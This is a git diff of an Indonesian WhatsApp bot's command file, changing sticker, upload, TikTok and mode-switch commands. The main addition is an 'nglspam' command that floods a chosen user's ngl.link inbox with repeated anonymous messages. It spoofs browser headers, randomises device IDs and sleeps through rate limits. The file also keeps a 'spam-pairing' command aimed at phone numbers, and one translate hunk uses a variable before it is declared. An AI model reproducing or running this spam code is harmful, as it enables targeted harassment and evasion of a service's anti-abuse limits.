-        "Jasjus Melon", "Teajus Apel", "Pop ice Mangga", "Teajus Gulabatu", 
-        "Air Selokan", "Air Kobokan", "TV Tabung", "Keran Air", "Tutup Panci", 
-        "Kotak Amal", "Tutup Termos", "Tutup Botol", "Kresek Item", "Kepala Casan", 
-        "Ban Serep", "Kursi Lipat", "Kursi Goyang", "Kulit Pisang", "Warung Madura", 
-        "Gorong-gorong", "Tai Kuda", "Tikus Kentut", "Banteng Merah", "Bajigur", 
-        "Bakso Sumatra", "Neymar Bogor", "Christiano Rojali", "Batagor", 
-        "Seblak Kalimantan", "Macan Putih", "Harimau Sumatra", "Harimau Putih", 
-        "Singa", "Raja Iblis", "Telur Betawi", "Cilok Goreng"
-    ]);
-    const damping = pickRandom(['1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'lahir']);
-    const khodam = `Khodam ${text}, adalah ${ceknyaa}, mendampingi dari ${damping}`;
-    const ttsUrl = googleTTS.getAudioUrl(khodam, {
-        lang: 'id', // Bahasa Indonesia
-        slow: false, // Kecepatan bicara normal
-        host: 'https://translate.google.com', // Host Google TTS
-    });
-    // Kirim pesan berupa audio
-    xyu.sendMessage(m.chat, {
-        audio: { url: ttsUrl },
-        mimetype: 'audio/mpeg',
-        ptt: true
-    }, { quoted: m });
-    break;
+case 'nglspam': {
+if (!isCreator && !isPremium) return reply(mess.prem)
+ if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
+ return m.reply("Masukan username, pesan, dan jumlah spam!\nContoh: .nglspam ditss|haloo|5");
+ }
+async function sendSpamMessage(username, message, spamCount) {
+ let counter = 0;
+ while (counter < spamCount) {
+ try {
+ const date = new Date();
+ const minutes = date.getMinutes();
+ const hours = date.getHours();
+ const formattedDate = `${hours}:${minutes}`;
+ const deviceId = crypto.randomBytes(21).toString('hex');
+ const url = 'https://ngl.link/api/submit';
+ const headers = {
+ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
+ 'Accept': '*/*',
+ 'Accept-Language': 'en-US,en;q=0.5',
+ 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+ 'X-Requested-With': 'XMLHttpRequest',
+ 'Sec-Fetch-Dest': 'empty',
+ 'Sec-Fetch-Mode': 'cors',
+ 'Sec-Fetch-Site': 'same-origin',
+ 'Referer': `https://ngl.link/${username}`,
+ 'Origin': 'https://ngl.link'
+ };
+ const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;
+
+ const response = await fetch(url, {
+ method: 'POST',
+ headers,
+ body,
+ mode: 'cors',
+ credentials: 'include'
+ });
+
+ if (response.status !== 200) {
+ console.log(`[${formattedDate}] [Err] Ratelimited`);
+ await new Promise(resolve => setTimeout(resolve, 25000));
+ } else {
+ counter++;
+ console.log(`[${formattedDate}] [Msg] Sent: ${counter}`);
+ }
+ } catch (error) {
+ console.error(`[${formattedDate}] [Err] ${error}`);
+ await new Promise(resolve => setTimeout(resolve, 5000));
+ }
+ }
+};
+ const [username, message, count] = text.split("|");
+ const spamCount = parseInt(count, 10);
+
+ if (isNaN(spamCount) || spamCount <= 0) {
+ return m.reply("Jumlah spam harus berupa angka positif!");
+ }
+
+ try {
+ await sendSpamMessage(username, message, spamCount);
+ m.reply(`Sukses mengirim ${spamCount} pesan NGL ke ${username}`);
+ } catch (e) {
+ console.error(e); // Menambahkan logging error untuk debug
+ return m.reply("Fitur error, coba lagi nanti.");
+ }
+}
+break
+
+
+
 //================================================================================
 
 case "gitclone": {
@@ -1830,51 +2153,22 @@ await m.reply(`Error! Repositori Tidak Ditemukan`)
 break
 
 //================================================================================
-
-case 'brat2': {
-if (!isPremium) return reply(mess.prem)
-const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
-  if (!quo) return m.reply("masukan teksnya woii");
-async function brat(text) {
-  try {
-    return await new Promise((resolve, reject) => {
-      if(!text) return reject("missing text input");
-      axios.get("https://brat.caliphdev.com/api/brat", {
-        params: {
-          text
-        },
-        responseType: "arraybuffer"
-      }).then(res => {
-        const image = Buffer.from(res.data);
-        if(image.length <= 10240) return reject("failed generate brat");
-        return resolve({
-          success: true, 
-          image
-        })
-      })
-    })
-  } catch (e) {
-    return {
-      success: false,
-      errors: e
-    }
-  }
-}
-
-const buf = await brat(quo);
-await xyu.imgToSticker(m.chat, buf.image, m, { packname: "Xyuraa", author: "Takashi - Botz" })
+case "brat": {
+if (!text) return m.reply(example('teksnya'))
+let res = await getBuffer(`https://qyuunee-brat.hf.space/brat?q=${text}`)
+await xyu.sendAsSticker(m.chat, res, m, {packname: "Takashi Botx"})
 }
 break
 //===============================================================================
 
-case 'brat': {
+case 'brat2': {
   const inputText = args.length > 0 
     ? args.join(" ") 
     : m.quoted?.text || null;
 
   if (!inputText) return reply("Masukkan teks!!");
   try {
-    const response = await axios.get(`https://fgsi-brat.hf.space/?text=${encodeURIComponent(inputText)}`, {
+    const response = await axios.get(`https://fgsi-brat.hf.space/?text=${encodeURIComponent(inputText)}&modeBlur=true`, {
       responseType: 'arraybuffer', 
     });
     const imageBuffer = Buffer.from(response.data);
@@ -1890,7 +2184,7 @@ break;
 
 //================================================================================
 
-case "tt": case "tiktok": {
+case "ttimg":{
 if (!text) return m.reply(example("url"))
 if (!text.startsWith("https://")) return m.reply(example("url"))
 await tiktokDl(q).then(async (result) => {
@@ -1958,7 +2252,7 @@ await xyu.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m}
 }
 break
 //===============================================================================
-
+/*
 case 'afk': {
 				let user = db.users[m.sender]
 				user.afkTime = + new Date
@@ -1966,6 +2260,7 @@ case 'afk': {
 				m.reply(`@${m.sender.split('@')[0]} Telah Afk${text ? ': ' + text : ''}`)
 			}
 			break
+			*/
 //================================================================================
 
 case 'delcase': {
@@ -2486,7 +2781,7 @@ case 'tess': {
 break;
 //================================================================================
 
-case "tourl": {
+case "tourl2": {
 if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
 let media = await xyu.downloadAndSaveMediaMessage(qmsg)
 const { ImageUploadService } = require('node-upload-images')
@@ -2501,29 +2796,76 @@ break
 
 //================================================================================
 
-case "tourl2": {
-if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
-if (!quoted) return m.reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
-let q = m.quoted ? m.quoted : m
-xyu.sendMessage(from, {
-react: {
-text: '🎁',
-key: m.key
+case "tourl": {
+  if (!/video/.test(mime) && !/image/.test(mime)) 
+    return m.reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`);
+  if (!quoted) 
+    return m.reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`);
+
+  let q = m.quoted ? m.quoted : m;
+
+  xyu.sendMessage(from, {
+    react: {
+      text: '🎁',
+      key: m.key
+    }
+  });
+
+  let media = await q.download();
+  let uploadImage = require('./lib/catmoe');
+  let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
+  let link = await (isTele ? uploadImage : uploadFile)(media);
+
+  const buttons = [
+    {
+      "name": "cta_copy",
+      "buttonParamsJson": `{"display_text":"Copy URL","id":"1234","copy_code":"${link}"}`
+    }
+  ];
+
+  const msg = generateWAMessageFromContent(m.chat, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: `*Your Link:* ${link}`
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
+            buttons: buttons
+          }),
+          contextInfo: {
+            mentionedJid: [m.sender],
+            forwardingScore: 999,
+            isForwarded: true
+          }
+        })
+      }
+    }
+  }, { quoted: m });
+
+  await xyu.relayMessage(m.chat, msg.message, {
+    messageId: msg.key.id
+  });
 }
-});
-let media = await q.download()
-let uploadImage = require('./lib/catmoe')
-let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
-let link = await (isTele ? uploadImage : uploadFile)(media)
-m.reply(`Your Link : ${link}`)
-}
-break
+break;
 
 
 //================================================================================
 
 case 'tr':
 case 'translate':{
+if (!teks) return;
+let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
 let translate = require('translate-google-api')
 let defaultLang = 'en'
 let tld = 'cn'
@@ -2992,7 +3334,6 @@ break
 case 'tiktoksearch':
 case 'ttsearch': {
     const dann = require('d-scrape')
-    if (!isPremium) return reply(mess.prem)
 if (!text) return reply(`Contoh : ${prefix + command} jj epep`)
 reply('Sedang Diproses ⏳')
 try {
@@ -3006,7 +3347,6 @@ break
 
 //===============================================================================
 case 'faketweet':{
-if (!isPremium) return reply(mess.prem)
 const canvafy = require('canvafy')
 if (!text) return reply(`Exmaple : Name1 | Name2 | Text`)
  nama1 = text.split("|")[0]
@@ -3027,7 +3367,6 @@ break
 //===============================================================================
 
 case 'sertitolol': {
-if (!isPremium) return reply(mess.prem)
 if (!text) throw `Example: ${prefix + command} username`
 reply(mess.wait)
 let buf = await getBuffer(`https://tolol.ibnux.com/img.php?nama=${q}`)
@@ -3038,7 +3377,6 @@ break
 //===============================================================================
 
 case 'quote': {
-if (!isPremium) return reply(mess.prem)
   try {
     if (!q) return reply(`contoh\n\nquote dingin tapi tidak mematikan`);
 // wm avs
@@ -3102,7 +3440,6 @@ break
 
 //===============================================================================
 case 'spam-pairing': case 'spam': {
-if (!isPremium) return reply(mess.prem)
 if (!isCreator) return reply(mess.owner)
 if (!text) return reply(`*Example:* ${prefix + command} +6288221325473|150`)
 let [peenis, pepekk = "200"] = text.split("|")
@@ -3296,6 +3633,7 @@ break
 
 case "developerbot": case "owner": case "creator":{
 await xyu.sendContact(m.chat, [global.owner], m)
+xyu.sendMessage(m.chat, {audio: fs.readFileSync('./src/mp3/owner.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})     
 }
 break
 
@@ -3317,14 +3655,27 @@ break
 
 //================================================================================
 
-case "self": {
+case "public": {
 if (!isCreator) return
-xyu.public = false
-m.reply("Berhasil mengganti ke mode *self*")
+xyu.public = true
+m.reply("succes ke mode *public* 🔵")
 }
 break
 
 //================================================================================
+
+
+case "self": {
+if (!isCreator) return
+xyu.public = false
+m.reply("succes ke mode *self* 🔴")
+}
+break
+
+
+
+//================================================================================
+
 
 case 'getcase': {
     const getCase = (cases) => {
@@ -3369,14 +3720,6 @@ break
 
 //================================================================================
 
-case "public": {
-if (!isCreator) return
-xyu.public = true
-m.reply("Berhasil mengganti ke mode *public*")
-}
-break
-
-//================================================================================
 
 case "restart": case "rst": {
 if (!isCreator) return Reply(mess.owner)
@@ -3403,7 +3746,7 @@ case 'brat3': {
  ctx.fillStyle = '#ffffff';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  const findOptimalFontSize = (text, maxWidth, maxHeight) => {
- let fontSize = 120;
+ let fontSize = 65;
  ctx.font = `bold ${fontSize}px ArialNarrow`;
  const words = text.split(' ');
  let lines = [];
@@ -3475,6 +3818,8 @@ let blurredBuffer = await image.getBufferAsync(Jimp.MIME_PNG);
   }
 }
 break
+
+
 //===============================================================================
 case "ocr":{
 let q = m?.quoted ? m?.quoted : m
@@ -3946,11 +4291,9 @@ await m.reply(String(err))
 
 //================================================================================
 
-if ((budy.match) && ["Assalamualaikum","Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
-let urel = `https://pomf2.lain.la/f/7ixvc40h.mp3`
-xyu.sendMessage(m.chat, {audio: {url: urel}, mimetype: 'audio/mpeg', ptt: true }, { quoted: m})
+if ((budy.match) && ["assalamualaikum","assalamu'alaikum","Assalamualaikum","Assalamu'alaikum"].includes(budy) && !isCmd) {
+xyu.sendMessage(m.chat, { audio: salamm, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
 }
-
 
 //================================================================================
 
